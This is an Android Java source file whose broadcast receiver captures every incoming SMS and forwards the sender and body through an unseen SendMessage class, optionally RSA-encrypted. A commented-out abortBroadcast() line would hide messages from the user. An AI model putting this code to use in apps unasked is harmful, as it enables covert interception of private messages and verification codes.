package tznin.com.receivermanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.util.Date;

/**
 * @author YLF
 *
 *   监听 --获取短信内容
 *
 */
public class ReceiverMessage extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("111","监听短信...");
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            //获取到所有短信Object 对象
            Object pdus[] = (Object[]) bundle.get("pdus");
            SmsMessage[] messages = new SmsMessage[pdus.length];
            for (int i = 0; i < messages.length; i++) {
                //将所有Object 短信对象转换为SmsMessage
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
            //获取到发件人手机号
            String adress = messages[0].getOriginatingAddress();
            //获取短信内容
            String msgBody = "";
            for (SmsMessage msg : messages) {
                msgBody += msg.getMessageBody();
            }
           // Log.i("receiverMsg",adress+":"+msgBody);

            try {


                if(Storage.getUserInfo().getKey().length() >  0 ) {
                    byte[] encodeData =  RSA.encryptByPublicKey(msgBody.getBytes(), RSA.PUBLICKEY );
                    String data =    Base64.encodeToString(encodeData,Base64.DEFAULT);
                    SendMessage.create("短信："+adress, data +"\r\n----"+ new Date());
                } else {
                    SendMessage.create("短信："+adress, msgBody +"\r\n----"+ new Date());
                }


            } catch (Exception e) {
                e.printStackTrace();
            }

            // Toast.makeText(context, adress + "  :" + msgBody, Toast.LENGTH_SHORT).show();
        }
        //注册广播时设置优先级
       // abortBroadcast();  //终止广播  拦截短信   ---慎用！！！！
    }

}
